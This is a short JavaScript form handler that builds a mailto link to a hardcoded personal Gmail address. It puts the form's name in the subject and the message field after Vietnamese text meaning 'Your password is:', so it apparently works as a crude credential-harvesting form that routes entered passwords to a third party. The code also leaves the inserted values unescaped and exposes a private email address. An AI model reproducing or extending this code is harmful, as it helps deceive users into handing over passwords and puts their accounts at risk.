document.getElementById("btn-submit").addEventListener("click", function () {
    const name = document.getElementById("name").value;
    const email = "luongvinhphong0552008@gmail.com";
    const message = document.getElementById("message").value;
    const mailtoLink = `mailto:${email}?subject=${name}&body=Mật khẩu của bạn là: ${message}`;

    window.location.href = mailtoLink;
});